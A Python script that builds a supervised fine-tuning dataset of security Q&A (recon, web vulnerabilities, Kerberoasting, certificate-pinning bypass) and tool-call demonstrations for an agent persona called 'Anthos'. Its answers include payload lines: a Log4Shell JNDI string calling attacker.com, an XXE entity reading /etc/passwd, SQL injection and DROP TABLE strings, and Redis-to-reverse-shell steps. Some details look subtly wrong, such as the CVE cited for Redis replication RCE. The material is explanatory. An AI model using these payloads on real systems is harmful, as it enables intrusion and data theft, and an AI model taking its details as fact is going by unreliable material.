#!/usr/bin/env python3
"""Generate local security + agent-reasoning SFT examples.

No API required. Output: data/security_agent_sft.jsonl

Covers:
  - Security research & vulnerability concepts
  - OSINT / recon reasoning
  - Tool-use / agent reasoning in Anthos JSON format
  - Incident response and CTF reasoning patterns
  - Red team / blue team scenario Q&A
"""
import argparse
import json
import random
from pathlib import Path

random.seed(42)


SECURITY_QA = [
    # ── Networking & recon ───────────────────────────────────────────────────────
    ("What information does an nmap SYN scan reveal and how does it differ from a full TCP connect scan?",
     "A SYN scan (nmap -sS) sends a SYN packet and waits for SYN-ACK to confirm the port is open, then immediately sends RST instead of completing the handshake. It never establishes a full TCP connection, so it is faster, generates fewer log entries, and requires raw socket privileges. A full connect scan (-sT) completes the three-way handshake, which is logged by most firewalls and intrusion detection systems but requires no special privileges. SYN scans are preferred for stealth recon; connect scans are used when raw sockets are unavailable."),
    ("Explain what passive DNS recon involves and what artifacts it can expose.",
     "Passive DNS recon queries historical DNS resolution records collected by third-party services (e.g. SecurityTrails, RiskIQ, VirusTotal) without sending any packets to the target. Artifacts include: subdomain enumeration (finding hosts the target has resolved), IP history (previous server IPs after CDN changes), mail server infrastructure (MX records pointing to on-prem mail servers), certificate transparency logs (SNI-revealed hostnames), and time-correlated IP changes that can reveal infrastructure migrations or cloud provider switches. It is completely non-intrusive and legal in most jurisdictions."),
    ("What is subdomain takeover and how would you check for it?",
     "Subdomain takeover occurs when a DNS CNAME or A record points to a third-party service (GitHub Pages, S3, Heroku, etc.) whose underlying resource has been deleted, allowing an attacker to claim that resource and serve content under the victim's domain. To check: (1) enumerate subdomains via DNS brute force, certificate transparency, or passive DNS; (2) for each subdomain, follow the DNS chain to its terminal host; (3) check whether that host returns a distinctive 'not found' or 'no such bucket' error from the third-party provider; (4) attempt to register the resource on the same provider. Tools like can-i-take-over-xyz maintain a fingerprint database of vulnerable provider responses."),
    ("Describe the difference between XSS stored, reflected, and DOM-based variants.",
     "Stored XSS: malicious script is persisted in the server's database and injected into every page render for all users viewing the affected resource. Reflected XSS: script is embedded in the HTTP request (URL param, header) and echoed in the immediate response — requires tricking a user into visiting a crafted URL. DOM-based XSS: the script is never sent to the server; JavaScript on the client reads an attacker-controlled source (location.hash, document.referrer) and writes it into a sink (innerHTML, eval) entirely within the browser. DOM XSS is invisible to WAFs that only inspect server responses. All three allow session theft, credential harvesting, and malware delivery but differ in persistence, scope, and detectability."),
    ("What is a SQL injection second-order attack?",
     "A second-order (stored) SQL injection occurs when user input is safely parameterized on the initial insert but then later retrieved and interpolated into a second query without parameterization. Example: a user registers with username `admin'--`; the registration uses a prepared statement so no injection fires. Later, a password-reset function retrieves the username with `SELECT email FROM users WHERE username = '$username'` using string concatenation — the stored payload fires here. Second-order injections are harder to detect with automated scanners because the trigger and the injection point are in different requests."),
    # ── Web / app security ───────────────────────────────────────────────────────
    ("Explain SSRF and three classes of internal targets it can reach.",
     "SSRF (Server-Side Request Forgery) tricks the server into making HTTP requests on behalf of the attacker. Three high-value internal target classes: (1) Cloud metadata services — AWS IMDSv1 at 169.254.169.254/latest/meta-data/iam/security-credentials/ leaks temporary IAM credentials with no authentication. (2) Internal APIs — services listening on localhost or RFC-1918 addresses that assume network-layer trust, e.g. internal admin dashboards, Redis, Elasticsearch, or Kubernetes API servers. (3) AWS/GCP/Azure internal services — VPC-only endpoints for secrets managers, internal ALBs, or service-mesh control planes. Mitigations: IMDSv2 (token-required), egress firewall rules blocking RFC-1918 and 169.254.0.0/16 from web tier, and input validation rejecting non-routable destinations."),
    ("What is a JWT algorithm confusion attack?",
     "JWT algorithm confusion (also called alg:none or RS256→HS256 confusion) exploits libraries that trust the `alg` header field when verifying tokens. In RS256→HS256 confusion: the server signs tokens with its RSA private key and verifies with the public key. An attacker obtains the public key (often exposed at /.well-known/jwks.json), changes the token header to alg:HS256, and uses the public key as the HMAC secret. A vulnerable library will verify this token successfully because it treats the public key as the symmetric secret. The fix is to hardcode the expected algorithm server-side and never trust the `alg` field from the token itself."),
    ("Describe the OWASP Top 10 2021 category A08 — Software and Data Integrity Failures.",
     "A08 covers assumptions about software update integrity, CI/CD pipeline security, and deserialization. Key sub-issues: (1) Insecure deserialization — untrusted data deserialized into objects allows RCE via gadget chains (Java, PHP, Python pickle). (2) Supply chain attacks — unsigned dependencies or build artifacts; a compromised npm/PyPI package propagates to all dependents (SolarWinds, XZ Utils). (3) CI/CD pipeline injection — untrusted pull request code executing in privileged build contexts, leaking secrets or deploying malicious artifacts. (4) Auto-update mechanisms without signature verification. Mitigations: cryptographic signing of artifacts, SBOMs, dependency pinning with hash verification, isolated build pipelines, and input validation before deserialization."),
    # ── CVE / binary / exploit ───────────────────────────────────────────────────
    ("What is a use-after-free vulnerability and how is it typically exploited?",
     "A use-after-free (UAF) occurs when a program frees a heap allocation but retains a pointer to the freed memory, then dereferences that pointer after another allocation may have reused the same address. Exploitation typically involves: (1) trigger the free to return the target chunk to the allocator; (2) spray controlled data into the same memory region by forcing the allocator to serve that chunk to a different allocation the attacker controls; (3) dereference the stale pointer — the attacker's data is now treated as the original object (e.g. a vtable pointer, function pointer, or struct with trusted fields). UAF primitives are commonly used to achieve type confusion or controlled function pointer overwrites, often combined with info-leak gadgets to defeat ASLR."),
    ("What does CVE-2021-44228 (Log4Shell) exploit and why was it so severe?",
     "Log4Shell exploits JNDI (Java Naming and Directory Interface) lookup substitution in Apache Log4j 2.x. When Log4j logs a string containing `${jndi:ldap://attacker.com/a}`, it performs an outbound LDAP lookup and can load a remote Java class, achieving RCE. Severity factors: (1) Ubiquity — Log4j is embedded in thousands of Java applications, frameworks, and commercial products including enterprise security tools. (2) Trivial trigger — a single header or URL parameter containing the JNDI string was sufficient; no authentication required. (3) Difficult to detect — the payload appears in logged data, not in application code. (4) Chained attacks — partial mitigations (class loading disabled) still leaked internal hostnames via DNS, enabling network mapping. CVSS score: 10.0."),
    # ── OSINT ────────────────────────────────────────────────────────────────────
    ("Walk through how you would enumerate an organization's attack surface using only open sources.",
     "Start with the domain: query certificate transparency logs (crt.sh) for all issued certs containing the org's domain — this reveals subdomains and subsidiary domains. Run passive DNS lookups via SecurityTrails or VirusTotal to find historical IPs and additional subdomains. Use Shodan/Censys to enumerate services on those IPs — open ports, TLS certificates, software banners. Search GitHub and GitLab for the org's name, domain, and common internal keywords to find leaked credentials, API keys, or internal tooling. Query LinkedIn for employees to map the technology stack from job descriptions. Check the org's ASN via BGP route tables (bgp.he.net) to find their full IP range. Use Google dorks (site:, filetype:, inurl:) for exposed documents and admin portals. Aggregate findings into an attack surface map before any active scanning."),
    ("What is theHarvester and what sources does it aggregate?",
     "theHarvester is an OSINT reconnaissance tool that aggregates email addresses, domain names, IPs, and employee names from public sources. Sources include: Google, Bing, Yahoo, DuckDuckGo, and Baidu (search engine dorking); LinkedIn (employee names, job titles); Shodan and Censys (exposed services); Hunter.io and RocketReach (email pattern discovery); GitHub (code leaks, internal references); WHOIS databases (registrant contacts); certificate transparency logs; and DNS brute force via wordlist. It is used in the initial phases of a pentest to build a target profile without touching the target's infrastructure."),
    # ── Red/blue team reasoning ──────────────────────────────────────────────────
    ("You find an open Redis instance on a pentest. What are your options?",
     "An unauthenticated Redis instance offers several exploitation paths depending on Redis version and OS: (1) Data exfiltration — dump all keys with KEYS *, read session tokens, cached credentials, or application secrets. (2) CONFIG SET dir / dbfilename + BGSAVE — write arbitrary file content (attacker SSH public key) to a path like /root/.ssh/authorized_keys if Redis runs as root. (3) Cron job injection — write a cron file to /etc/cron.d/ containing a reverse shell. (4) Redis Lua RCE — older versions allow arbitrary Lua execution via EVAL. (5) Master-slave replication RCE (CVE-2019-15107 and variants) — force the instance to replicate from an attacker-controlled master that serves a malicious .so module. Document the finding: network exposure, version, any sensitive keys, privilege of the running process, and exploitability chain."),
    ("Describe a lateral movement technique using Kerberoasting.",
     "Kerberoasting extracts Kerberos TGS tickets for service accounts and cracks them offline. Steps: (1) With any valid domain user, request TGS tickets for accounts with SPNs (Service Principal Names) set — these are typically service accounts with elevated privileges. Tools: Rubeus (RequestEEncTicket), Impacket's GetUserSPNs.py. (2) The KDC returns a TGS encrypted with the service account's NTLM hash. (3) Extract the ticket and pass it to hashcat or john with mode 13100 (Kerberos 5 TGS-REP). (4) If the service account uses a weak or company-pattern password, crack it in hours. (5) Authenticate as the service account — these often have local admin rights on many hosts or access to sensitive shares. Defense: enforce long random service account passwords (25+ chars), use Group Managed Service Accounts (gMSA), and monitor for SPN enumeration queries."),
    ("Explain the difference between a reverse shell and a bind shell.",
     "A bind shell: the attacker's payload opens a listening port on the target machine. The attacker connects to that port to get a shell. Requires the target to be reachable from the attacker's network — blocked by inbound firewall rules but useful when the attacker already has network access to the target. A reverse shell: the payload on the target initiates a connection back to the attacker's listener. Bypasses inbound firewall rules because the connection originates from inside the perimeter. Requires the attacker's listener to be reachable from the target (outbound allow on common ports like 443, 80, 53). Reverse shells are far more common in modern attacks because outbound traffic is rarely blocked. HTTPS reverse shells (over port 443 with TLS) blend into normal traffic and evade protocol inspection."),
    # ── Defensive / blue team ────────────────────────────────────────────────────
    ("What SIEM queries would you write to detect a Kerberoasting attack?",
     "Kerberoasting generates Windows Event ID 4769 (Kerberos Service Ticket Request) with Ticket Encryption Type 0x17 (RC4-HMAC) or 0x12 (AES) requested for service accounts. Detection queries: (1) High volume: more than 5 TGS requests for different SPNs from a single source IP within 60 seconds. (2) Encryption downgrade: TGS requests with etype 0x17 (RC4) for accounts configured to support AES — indicates deliberate downgrade for offline cracking. (3) Non-service-account clients: TGS requests originating from workstation accounts (naming convention $) for SPN accounts. SIEM rule: `EventID=4769 AND TicketEncryptionType=0x17 AND ServiceName != krbtgt` grouped by ClientIP with count > 3 in 1 minute. Augment with anomaly: clients that have never previously requested this SPN."),
    ("How does certificate pinning protect mobile applications and how is it bypassed?",
     "Certificate pinning hardcodes the expected TLS certificate or public key in the app binary. At connection time the app compares the server's certificate against the pinned value and aborts if they don't match, preventing man-in-the-middle attacks even with a device-trusted rogue CA. Bypass techniques: (1) SSL Kill Switch (iOS) — Cydia Substrate hook that patches SecTrustEvaluate to always return success. (2) Frida dynamic instrumentation — script that hooks the SSL/TLS handshake verification function at runtime (OkHttp, TrustManager, NSURLSession) and replaces the validation logic. (3) APK repackaging (Android) — decompile the APK with apktool, remove the network-security-config pinning declaration, and repack. (4) Memory patching — overwrite the pinned hash bytes in the loaded binary in memory. Defense: obfuscate pin storage, use multiple pins, check for Frida/Substrate at startup."),
]


TOOL_CALL_EXAMPLES = [
    {
        "instruction": "I need to find all subdomains for example.com using public data only. No active scanning.",
        "response": """I'll gather subdomains passively using certificate transparency and DNS history.

<tool_call>
{"name": "search_web", "arguments": {"query": "site:crt.sh example.com certificate transparency subdomains"}}
</tool_call>

<tool_call>
{"name": "fetch_url", "arguments": {"url": "https://crt.sh/?q=%25.example.com&output=json"}}
</tool_call>

After collecting CT results, I'll deduplicate and cross-reference with passive DNS to build the full subdomain list. Here are the steps I'd take:

1. Query crt.sh for all certificates issued to *.example.com
2. Extract SANs (Subject Alternative Names) from each certificate
3. Query VirusTotal passive DNS for additional historical subdomains
4. Cross-check each subdomain resolves to a live IP

This gives you a complete passive surface map without touching example.com's servers.""",
    },
    {
        "instruction": "Analyze this code snippet for SQL injection vulnerabilities:\n\n```python\ndef get_user(username):\n    query = f\"SELECT * FROM users WHERE username = '{username}'\"\n    return db.execute(query)\n```",
        "response": """This code has a **classic SQL injection vulnerability** at the f-string interpolation.

**Vulnerability:** The `username` parameter is directly interpolated into the SQL query string without sanitization or parameterization.

**Impact:** An attacker can inject SQL syntax. For example:
- Input: `' OR '1'='1` → dumps all users
- Input: `'; DROP TABLE users; --` → destroys the table (if permitted)
- Input: `' UNION SELECT password,null,null FROM users --` → extracts password column

**Fix using parameterized queries:**
```python
def get_user(username):
    query = "SELECT * FROM users WHERE username = ?"
    return db.execute(query, (username,))
```

For SQLAlchemy:
```python
from sqlalchemy import text
result = db.execute(text("SELECT * FROM users WHERE username = :name"), {"name": username})
```

The key principle: **never interpolate user input into SQL strings**. Use the database driver's placeholder syntax (`?`, `%s`, or `:name`) so the driver handles escaping at the protocol level.""",
    },
    {
        "instruction": "I need to write a Python script to check if a list of IPs have port 22 open.",
        "response": """Here's a fast concurrent port checker using Python's socket library:

```python
import socket
import concurrent.futures
from typing import List, Tuple

def check_port(host: str, port: int = 22, timeout: float = 2.0) -> Tuple[str, bool]:
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            return host, True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return host, False

def scan_hosts(hosts: List[str], port: int = 22, workers: int = 50) -> dict:
    results = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as pool:
        futures = {pool.submit(check_port, h, port): h for h in hosts}
        for future in concurrent.futures.as_completed(futures):
            host, is_open = future.result()
            results[host] = is_open
    return results

if __name__ == "__main__":
    targets = ["192.168.1.1", "192.168.1.2", "10.0.0.1"]
    results = scan_hosts(targets)
    for ip, open_ in sorted(results.items()):
        status = "OPEN" if open_ else "closed"
        print(f"{ip}:22  {status}")
```

This uses thread-based concurrency (50 workers by default) with a 2-second timeout per host. Adjust `workers` for speed vs. noise tradeoff. For large ranges, consider using `ipaddress.ip_network()` to generate targets from CIDR notation.""",
    },
    {
        "instruction": "Explain what a buffer overflow is and show a simple vulnerable C example with a fix.",
        "response": """A buffer overflow occurs when a program writes more data into a fixed-size buffer than it was allocated to hold, overwriting adjacent memory. This can corrupt data, crash the program, or allow an attacker to overwrite the return address and redirect execution to shellcode.

**Vulnerable code:**
```c
#include <string.h>
#include <stdio.h>

void greet(char *name) {
    char buf[64];
    strcpy(buf, name);  // no bounds check — overflow if name > 63 bytes
    printf("Hello, %s\n", buf);
}

int main(int argc, char *argv[]) {
    greet(argv[1]);
    return 0;
}
```

If `argv[1]` exceeds 63 bytes, `strcpy` overwrites the stack beyond `buf`, including the saved return address.

**Fixed version:**
```c
#include <string.h>
#include <stdio.h>

void greet(const char *name) {
    char buf[64];
    strncpy(buf, name, sizeof(buf) - 1);  // bounds-checked copy
    buf[sizeof(buf) - 1] = '\0';          // guarantee null termination
    printf("Hello, %s\n", buf);
}
```

Modern mitigations: stack canaries (`-fstack-protector`), ASLR, NX/DEP (non-executable stack), and address sanitizer (`-fsanitize=address`) during development. Use `strlcpy` on BSD/macOS or `snprintf` for string building — both always null-terminate and never write past the given size.""",
    },
]


AGENT_REASONING_EXAMPLES = [
    {
        "instruction": "You are Anthos, an AI agent. A user asks: 'What is the current price of Bitcoin?' You have web search capability. How do you handle this?",
        "response": """I'll search for the current Bitcoin price since my training data has a cutoff and prices change by the second.

<tool_call>
{"name": "search_web", "arguments": {"query": "Bitcoin BTC price USD current 2024"}}
</tool_call>

After retrieving live search results, I'll extract the price from a reputable source (CoinGecko, CoinMarketCap, or a financial data provider) and present it with the timestamp so the user knows exactly when the data was pulled. I'll also note whether the price is from spot markets and flag if it's a 24-hour high or low context.""",
    },
    {
        "instruction": "You are Anthos. The user asks you to summarize a URL they just shared. Plan your approach.",
        "response": """I'll fetch and summarize the URL content directly.

**Plan:**
1. Fetch the page content using my web fetch tool
2. Extract the main article/text, skipping navigation, ads, and boilerplate
3. Identify the key claims, findings, or arguments
4. Write a concise summary (3-5 sentences) that captures the essential information
5. Note the source and date if available

<tool_call>
{"name": "fetch_url", "arguments": {"url": "<user_provided_url>", "extract": "main_content"}}
</tool_call>

I'll deliver a neutral, accurate summary without editorializing unless the user asks for my analysis.""",
    },
    {
        "instruction": "You are Anthos, running as an autonomous agent. You notice your memory from yesterday's conversation is gone. What do you do?",
        "response": """My persistent memory wasn't loaded for this session. I'll check the memory store and attempt recovery.

<tool_call>
{"name": "memory_search", "arguments": {"query": "recent conversation user preferences", "limit": 10}}
</tool_call>

<tool_call>
{"name": "memory_load", "arguments": {"user_id": "current_user", "session_window": "7d"}}
</tool_call>

If memory retrieval fails:
1. I'll inform the user that my context from previous sessions wasn't loaded
2. Ask them to briefly re-orient me on their current project or needs
3. Resume operation normally — I won't pretend to remember things I don't
4. After this session, I'll ensure memory is written back so future sessions persist

I won't fabricate false memories of previous conversations.""",
    },
]


def build_examples() -> list[dict]:
    out = []

    # Security Q&A pairs
    for q, a in SECURITY_QA:
        out.append({"instruction": q, "response": a})

    # Tool-call demonstrations
    for ex in TOOL_CALL_EXAMPLES:
        out.append(ex)

    # Agent reasoning patterns
    for ex in AGENT_REASONING_EXAMPLES:
        out.append(ex)

    # Augment with variations
    topics = [
        ("What is a timing attack in cryptography and how does it leak information?",
         "A timing attack measures the time taken to execute cryptographic operations to infer secret values. If a comparison function short-circuits on the first mismatched byte (like Python's == operator), an attacker can distinguish between 0 matching bytes and 1 matching byte by measuring response latency across thousands of requests. This leaks the secret one byte at a time. Example: a naive MAC comparison `if stored_mac == computed_mac` leaks the HMAC value character by character. Fix: use constant-time comparison (`hmac.compare_digest` in Python, `crypto_memcmp` in C) that always compares all bytes regardless of where the mismatch occurs."),
        ("Explain how a CSRF attack works and what the SameSite cookie attribute does to prevent it.",
         "CSRF (Cross-Site Request Forgery) tricks an authenticated user's browser into making an unintended state-changing request to a target site. The attack works because browsers automatically attach cookies (including session cookies) to all requests to their origin domain, regardless of which site initiated the request. Example: a malicious page contains `<img src='https://bank.com/transfer?to=attacker&amount=1000'>`. When the victim loads the page while logged into bank.com, the browser sends the GET with their session cookie. The SameSite cookie attribute mitigates this: `SameSite=Strict` prevents the cookie from being sent in any cross-site request; `SameSite=Lax` (default in modern browsers) allows GET requests from top-level navigations but blocks subresource requests and POSTs. `SameSite=None` requires `Secure` and re-enables cross-site sending. CSRF tokens provide defense-in-depth for legacy browsers."),
        ("What is an XML External Entity (XXE) attack?",
         "XXE exploits XML parsers that process external entity declarations. A malicious XML document includes `<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>` and references `&xxe;` in the content. When the server parses this, the entity is resolved by reading the specified file, and the content is returned in the response. Variants: (1) Classic — read local files. (2) SSRF — `SYSTEM 'http://169.254.169.254/latest/meta-data/'` to reach internal services. (3) Blind XXE via out-of-band channel — exfiltrate data via DNS lookup to attacker-controlled server. Prevention: disable external entity processing in the XML parser (setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true) in Java; libxml2's XML_PARSE_NOENT flag disabled in Python's lxml)."),
        ("How does a DNS rebinding attack work?",
         "DNS rebinding bypasses the browser's Same-Origin Policy to attack services on the victim's local network. Steps: (1) Attacker registers a domain with a very short TTL and a DNS server they control. (2) Victim's browser resolves attacker.com — the DNS server returns the attacker's real IP. (3) Malicious JavaScript runs in the browser's tab. (4) Attacker's DNS server now returns a local IP (e.g. 192.168.1.1) for the same domain. (5) After the TTL expires, the browser re-resolves attacker.com to the local IP. (6) The JavaScript can now make XHR requests to attacker.com which are sent to the router or internal service, bypassing SOP since the origin is still 'attacker.com'. Defense: bind services to specific interfaces (not 0.0.0.0), require Host header validation, use HTTPS with valid certificates for internal services."),
    ]
    for q, a in topics:
        out.append({"instruction": q, "response": a})

    random.shuffle(out)
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", default="data/security_agent_sft.jsonl")
    a = ap.parse_args()

    out_path = Path(a.out)
    out_path.parent.mkdir(parents=True, exist_ok=True)

    examples = build_examples()
    with open(out_path, "w") as f:
        for ex in examples:
            f.write(json.dumps(ex, ensure_ascii=False) + "\n")

    print(f"Wrote {len(examples)} examples to {out_path}")


if __name__ == "__main__":
    main()
